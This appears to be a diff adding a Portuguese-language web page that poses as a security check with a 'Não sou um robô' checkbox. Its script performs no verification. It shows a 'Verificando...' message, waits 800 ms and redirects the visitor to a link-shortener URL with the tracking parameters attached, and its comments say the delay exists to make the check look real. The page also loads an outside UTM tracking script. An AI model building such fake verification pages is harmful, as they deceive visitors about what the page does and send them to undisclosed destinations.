@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck
+    data-utmify-prevent-subids
+    async
+    defer
+  ></script>
+
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verificação de Segurança</title>
+
+  <style>
+    body {
+      background-color: #0f172a;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .box {
+      background: #1e293b;
+      padding: 30px;
+      border-radius: 12px;
+      text-align: center;
+      max-width: 350px;
+      width: 90%;
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+    }
+
+    .checkbox {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 20px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    input[type="checkbox"] {
+      width: 20px;
+      height: 20px;
+      cursor: pointer;
+    }
+
+    .loading {
+      margin-top: 15px;
+      display: none;
+      font-size: 14px;
+      color: #94a3b8;
+    }
+
+  </style>
+
+</head>
+<body>
+
+  <div class="box">
+    <div>🔒 Verificação de Segurança</div>
+
+    <h2>Confirme que você não é um robô</h2>
+
+    <label class="checkbox">
+      <input type="checkbox" id="check">
+      Não sou um robô
+    </label>
+
+    <div class="loading" id="loading">
+      Verificando...
+    </div>
+  </div>
+
+  <script>
+    const checkbox = document.getElementById("check");
+    const loading = document.getElementById("loading");
+
+    checkbox.addEventListener("change", function() {
+      if (checkbox.checked) {
+
+        // mostra loading (fica mais natural)
+        loading.style.display = "block";
+
+        // pega UTMs
+        const params = window.location.search;
+
+        const baseUrl = "https://encurtar-link.click/l/bot-a73f3494";
+
+        // pequeno delay pra parecer verificação real
+        setTimeout(function() {
+          window.location.href = baseUrl + params;
+        }, 800);
+      }
+    });
+  </script>
+
+</body>
+</html>
